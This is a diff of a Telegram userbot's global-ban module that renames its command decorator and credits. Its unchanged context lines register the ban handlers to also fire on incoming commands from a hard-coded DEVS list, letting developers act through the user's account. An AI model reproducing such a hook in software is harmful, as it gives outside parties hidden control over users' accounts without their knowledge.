@@ -1,11 +1,11 @@
 # Credits: @mrismanaziz
 # Recode by @greyyvbss
-# Recode by @BukanBdrl
+# Recode by @mfbyh
 
 from telethon.events import ChatAction
 
 from userbot import DEVS, bot, owner
-from userbot.events import bdrl_cmd, register
+from userbot.events import keyy_cmd, register
 from userbot.utils import get_user_from_event
 
 # Ported For Lord-Userbot by liualvinas/Alvin
@@ -42,7 +42,7 @@ async def handler(tele):
                         return
 
 
-@bot.on(bdrl_cmd(outgoing=True, pattern=r"gband(?: |$)(.*)"))
+@bot.on(keyy_cmd(outgoing=True, pattern=r"gband(?: |$)(.*)"))
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cgband(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
@@ -110,7 +110,7 @@ async def gben(userbot):
         f"**Action:** `Global Banned by {owner}`"
     )
 
-@bot.on(bdrl_cmd(outgoing=True, pattern=r"ungband(?: |$)(.*)"))
+@bot.on(keyy_cmd(outgoing=True, pattern=r"ungband(?: |$)(.*)"))
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cungband(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
